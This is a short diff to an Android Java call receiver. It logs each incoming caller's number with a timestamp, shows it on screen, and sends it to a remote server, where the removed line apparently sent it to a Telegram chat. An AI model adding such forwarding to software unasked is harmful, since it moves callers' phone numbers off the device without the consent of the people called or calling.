@@ -20,7 +20,7 @@ public class CallReceiver extends PhonecallReceiver {
         strMessage.append("[" + new Date() + "]").append("Incoming call from ").append(number).append("\n");
         Log.d(TAG, "onReceiveIncomingCall: " + strMessage);
         Toast.makeText(App.getInstance(), strMessage.toString(), Toast.LENGTH_LONG).show();
-        ServerHelper.getRequest(ChatIDTelegramHelper.RangeChatID, strMessage.toString());
+        ServerHelper.getRequest(strMessage.toString());
     }
 
     public void onIncomingCallAnswered(Context ctx, String number, Date start) {
